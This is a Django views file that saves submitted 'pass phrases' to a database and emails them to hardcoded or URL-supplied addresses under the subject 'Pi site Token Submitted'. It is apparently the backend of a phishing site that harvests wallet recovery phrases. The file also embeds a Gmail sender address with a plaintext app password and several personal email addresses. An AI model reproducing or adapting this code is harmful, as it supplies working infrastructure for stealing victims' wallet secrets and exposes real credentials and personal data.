from django.shortcuts import render
from firebmail import sendmail as sending_no
from datetime import datetime
from django.http import HttpResponse
from urllib.parse import unquote
from .models import PassPhrase

# Create your views here.


def send_notify(subject, payload, email_to):
    sender = "ezekielizuchi2018@gmail.com"
    password = "pvos glgf nxal finc"
    recipient = email_to
    
    return sending_no(
        payload=payload,
        recipient=recipient,
        sender=sender,
        password=password,
        subject=subject
    )

def sendmail(request, keys, email):
    current_date = datetime.now()
    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")    
    decoded_param = unquote(keys)

    exists = PassPhrase.objects.filter(keys = decoded_param).exists()

    if not exists:
        saved = PassPhrase.objects.create(
            keys = decoded_param
        )
        saved.save()

        if email == 'no@no.com':
            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')

        else:
            send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)

                    
    # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
    
    return HttpResponse('OK')

def send_notify2(request, sender, password, email_to,keys, subject=None, payload=None):
    recipient = email_to
    password = unquote(password)
    current_date = datetime.now()
    formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
    keys = unquote(keys)
    if subject == None and payload == None:
        sending_no(
            payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )',
            subject=f'Pi site Token Submitted {formatted_time}',
            recipient=recipient,
            sender = sender,
            password = password,
        )
    else:
        payload = unquote(payload)
        subject = unquote(subject)
        sending_no(
            payload= payload,
            subject=subject,
            recipient=recipient,
            sender = sender,
            password = password,
        )
    return HttpResponse('OK')

